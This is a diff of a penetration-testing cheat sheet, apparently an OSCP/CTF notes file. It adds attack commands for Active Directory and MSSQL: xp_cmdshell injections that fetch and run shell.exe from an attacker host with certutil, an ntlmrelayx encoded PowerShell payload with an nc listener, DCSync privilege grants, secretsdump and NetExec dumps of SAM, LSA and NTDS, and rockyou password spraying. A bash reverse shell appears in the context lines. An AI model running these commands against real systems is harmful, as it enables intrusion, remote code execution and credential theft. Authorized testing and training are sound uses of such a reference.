@@ -645,6 +647,23 @@ add_principal <EMAIL>            // add a new user to a keytab file
 ksu                              // executes a command with kerberos authentication
 klist -k /etc/krb5.keytab        // lists keytab file
 kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
+```
+
+##### Ticket Conversion
+
+###### kribi to ccache
+
+```c
+base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
+impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
+export KRB5CCNAME=`realpath <USERNAME>.ccache`
+```
+
+###### ccache to kirbi
+
+```c
+impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi
+base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64
 ```
 
 #### Ligolo-ng
@@ -680,7 +699,7 @@ sudo ip link set ligolo up
 ./agent -connect <LHOST>:443 -ignore-cert
 ```
 
-##### Session
+##### Configure Session
 
 ```c
 ligolo-ng » session
@@ -696,6 +715,12 @@ sudo ip r add 172.16.1.0/24 dev ligolo
 
 ```c
 [Agent : user@target] » start
+```
+
+###### Port Forwarding
+
+```c
+[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
 ```
 
 #### Linux
@@ -803,6 +828,7 @@ sudo python3 -m http.server 80
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
 xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
 rdesktop <RHOST>
+xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 ```
 
 #### showmount
@@ -813,20 +839,26 @@ sudo showmount -e <RHOST>
 chown root:root sid-shell; chmod +s sid-shell
 ```
 
+#### SMB
+
+```c
+mount.cifs //<RHOST>/<SHARE> /mnt/remote
+guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
+```
+
 #### smbclient
 
 ```c
 smbclient -L \\<RHOST>\ -N
 smbclient -L //<RHOST>/ -N
 smbclient -L ////<RHOST>/ -N
-smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
 smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
+smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
+smbclient //<RHOST>/<SHARE> -U <USERNAME>
 smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
 smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
-mount.cifs //<RHOST>/<SHARE> /mnt/remote
-guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 ```
 
 ##### Download multiple files at once
@@ -836,14 +868,6 @@ mask""
 recurse ON
 prompt OFF
 mget *
-```
-
-##### Upload multiple Files at once
-
-```c
-recurse ON
-prompt OFF
-mput *
 ```
 
 #### socat
@@ -1979,6 +2003,7 @@ enum_impersonate
 ```c
 impacket-mssqlclient <USERNAME>@<RHOST>
 impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
+impacket-mssqlclient -k -no-pass <RHOST>
 sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 ```
 
@@ -2061,6 +2086,39 @@ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
+##### Linked SQL Server Enumeration
+
+```c
+SQL> SELECT user_name();
+SQL> SELECT name,sysadmin FROM syslogins;
+SQL> SELECT srvname,isremote FROM sysservers;
+SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+```
+
+##### xp_cmdshell
+
+```c
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+```
+
+```c
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+```c
+';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
+```
+
 #### MySQL
 
 ```c
@@ -2090,22 +2148,6 @@ mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_
 mysql> \! /bin/sh
 ```
 
-##### xp_cmdshell
-
-```c
-SQL> EXEC sp_configure 'Show Advanced Options', 1;
-SQL> reconfigure;
-SQL> sp_configure;
-SQL> EXEC sp_configure 'xp_cmdshell', 1;
-SQL> reconfigure
-SQL> xp_cmdshell "whoami"
-```
-
-```c
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami
-```
-
 ##### Insert Code to get executed
 
 ```c
@@ -2116,17 +2158,6 @@ mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >&
 
 ```c
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
-```
-
-##### Linked SQL Server Enumeration
-
-```c
-SQL> SELECT user_name();
-SQL> SELECT name,sysadmin FROM syslogins;
-SQL> SELECT srvname,isremote FROM sysservers;
-SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 ```
 
 #### NoSQL Injection
@@ -2209,6 +2240,7 @@ OK
 ##### Master List
 
 ```c
+';#---              // insert everywhere! Shoutout to xsudoxx!
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
@@ -2423,6 +2455,15 @@ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wor
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 ```
 
+#### Group Policy Preferences (GPP)
+
+##### gpp-decrypt
+
+```c
+python3 gpp-decrypt.py -f Groups.xml
+python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
 #### hashcat
 
 > https://hashcat.net/hashcat/
@@ -2435,6 +2476,7 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 
 ```c
 hashcat --example-hashes
+hashcat --help | grep -i "ntlm"
 ```
 
 ```c
@@ -2507,7 +2549,7 @@ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 ```c
 hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
-hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
+hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
 ```
 
 ```c
@@ -2516,15 +2558,11 @@ unset HYDRA_PROXY
 ```
 
 ```c
-hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
-```
-
-```c
-hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
-
-hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
-
-hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
+hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
+hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
+hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 
 #### John
@@ -2616,9 +2654,55 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 #### NetExec
 
 ```c
+netexec smb <RHOST> -u '' -p '' --shares
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+netexec smb <RHOST> -u " " -p "" --shares
+netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
+netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
+netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True
+netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+netexec smb <RHOST> -u guest -p '' --shares --rid-brute
+netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
+netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
+netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
+netexec smb <RHOST> -u "<USERNAME>" --use-kcache --users
+netexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
+netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
+netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
+netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
+netexec ldap <RHOST> -u '' -p '' -M get-desc-users
+netexec ldap <RHOST> -u "" -p "" -M get-desc-users
+netexec ldap <RHOST> -u "" -p "" --use-kcache -M whoami
+netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
+netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
+netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --bloodhound -ns <RHOST> -c all
+netexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
+netexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
+netexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
 netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 netexec wmi <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
 ```
 
 #### pypykatz
@@ -2786,6 +2870,36 @@ meterpreter > download *
 
 ### Post Exploitation
 
+#### Account Operators Group Membership
+
+##### Add User
+
+```c
+net user <USERNAME> <PASSWORD> /add /domain
+net group "Exchange Windows Permissions" /add <USERNAME>
+```
+
+##### Import PowerView
+
+```c
+powershell -ep bypass
+. .\PowerView.ps1
+```
+
+##### Add DCSync Rights
+
+```c
+$pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=local" -PrincipalIdentity <USERNAME> -Rights DCSync
+```
+
+##### DCSync
+
+```c
+impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
+```
+
 #### Active Directory Certificate Services (AD CS)
 
 ```c
@@ -2851,17 +2965,17 @@ certipy relay -ca '<CA>' -template <TEMPLATE>
 python3 PetitPotam.py <RHOST> <DOMAIN>
 certipy auth -pfx dc.pfx -dc-ip <RHOST>
 export KRB5CCNAME=dc.ccache
-sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ```
 
 ###### Coercing
 
 ```c
-sudo ntlmrelayx.py -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
+impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
 python3 PetitPotam.py <RHOST> <DOMAIN>
 python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
 export KRB5CCNAME=dc.ccache
-sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ```
 
 ##### ESC9: No Security Extensions
@@ -2902,16 +3016,24 @@ certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
 certipy relay -target 'rpc://<CA>' -ca 'CA'
 certipy auth -pfx administrator.pfx -domain <DOMAIN>
 ```
-### ADCSTemplate
+
+#### ADCSTemplate
 
 ```c
 Import-Module .\ADCSTemplate.psm1
 New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
 ```
 
+#### ADMiner
+
+```c
+AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
+```
+
 #### BloodHound
 
 ```c
+sudo apt-get install openjdk-11-jdk
 pip install bloodhound
 sudo apt-get install neo4j
 sudo apt-get install bloodhound
@@ -2926,11 +3048,7 @@ sudo apt-get update
 sudo apt-get install apt-transport-https
 sudo apt-get install neo4j
 systemctl start neo4j
-```
-
-```c
-sudo neo4j start console
-sudo bloodhound --no-sandbox
+./bloodhound --no-sandbox
 ```
 
 >  http://localhost:7474/browser/
@@ -2952,9 +3070,10 @@ ALTER USER neo4j SET PASSWORD '<PASSWORD>'
 #### BloodHound Python
 
 ```c
-bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
-bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
-bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>'-ns <RHOST> -c all --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
 ```
 
 #### bloodyAD
@@ -3000,7 +3119,7 @@ certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
 ##### Account Creation
 
 ```c
-certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
+certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <RHOST> -user <COMPUTERNAME>
 ```
 
 ##### Authentication
@@ -3066,66 +3185,163 @@ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIV
 
 #### Impacket
 
+##### impacket-atexec
+
 ```c
-impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
+impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
+```
+
+##### impacket-dcomexec
+
+```c
+impacket-dcomexec -object MMC20 -debug -silentcommand <DOMAIN>/<USERNAME>:'<PASSWORD>'<RHOST> '<COMMAND>'
+```
+
+##### impacket-findDelegation
+
+```c
+impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
+```
+
+##### impacket-GetADUsers
+
+```c
 impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
-impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
-impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
-impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
-impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
-impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
-impacket-smbserver local . -smb2support
-```
-
-##### impacket-smbclient
-
-```c
-export KRB5CCNAME=<USERNAME>.ccache
-impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
-```
-
-##### impacket-getTGT
-
-```c
-impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
-impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-GetNPUsers
 
 ```c
-impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
-impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
+impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
+impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
+```
+
+##### impacket-getST
+
+```c
+impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
+impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
+```
+
+##### impacket-getTGT
+
+```c
+impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
+impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-getUserSPNs
 
 ```c
-export KRB5CCNAME=<USERNAME>.ccache
-impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
+impacket-GetUserSPNs -request -dc-ip <RHOST> <DOMAIN>/<USERNAME>
 ```
-
-##### impacket-secretsdump
 
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
-impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
-impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
-impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
-impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
-impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
+```
+
+##### impacket-lookupsid
+
+```c
+impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+##### impacket-netview
+
+```c
+impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
+```
+
+##### impacket-ntlmrelayx
+
+###### Common Commands
+
+```c
+impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
+```
+
+###### Example
+
+```c
+impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA<--- CUT FOR BREVITY --->"
+```
+
+```c
+dir \\<LHOST>\foobar
+```
+
+```c
+nc -lnvp <LPORT>
 ```
 
 ##### impacket-psexec
 
 ```c
 impacket-psexec <USERNAME>@<RHOST>
-impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+```
+
+##### impacket-req
+
+```c
+impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
+```
+
+##### impacket-rpcdump
+
+```c
+impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+##### impacket-samrdump
+
+```c
+impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+##### impacket-secretsdump
+
+```c
+impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
+impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+```
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
+```
+
+##### impacket-services
+
+```c
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
+```
+
+##### impacket-smbclient
+
+```c
+impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
+```
+
+##### impacket-smbpasswd
+
+```c
+impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
+```
+
+##### impacket-smbserver
+
+```c
+impacket-smbserver local . -smb2support
 ```
 
 ##### impacket-ticketer
@@ -3138,21 +3354,21 @@ impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b5
 
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
-impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
+impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
 ```
 
-##### Fixing [-] exceptions must derive from BaseException
+###### Fixing [-] exceptions must derive from BaseException
 
 ###### Issue
 
 ```c
-impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST> -no-pass -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] exceptions must derive from BaseException
 ```
 
-###### How to fix it
+###### To fix it
 
 ```c
 241         if self.__doKerberos:
@@ -3165,7 +3381,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 > https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py
 
 ```c
-$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
+python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
 ```
 
 ###### Fixing msada_guids Error
@@ -3184,7 +3400,16 @@ Then put the `msada_guids.py` into the same directory as `dacledit.py`
 > https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py
 
 ```c
-$ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
+python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
+```
+
+##### ThePorgs Fork
+
+```c
+pipenv shell
+git clone https://github.com/ThePorgs/impacket/
+pip3 install -r requirements.txt
+sudo python3 setup.py install
 ```
 
 #### JAWS
@@ -3861,8 +4086,10 @@ rm ./'--checkpoint-action=exec=python script.sh'
 ```c
 systeminfo
 whoami /all
-net users
-net users <USERNAME>
+net user
+net user /domain
+net user <USERNAME>
+tree /f C:\Users\
 tasklist /SVC
 sc query
 sc qc <SERVICE>
@@ -4094,7 +4321,20 @@ robocopy /b E:\Windows\ntds . ntds.dit
 impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 ```
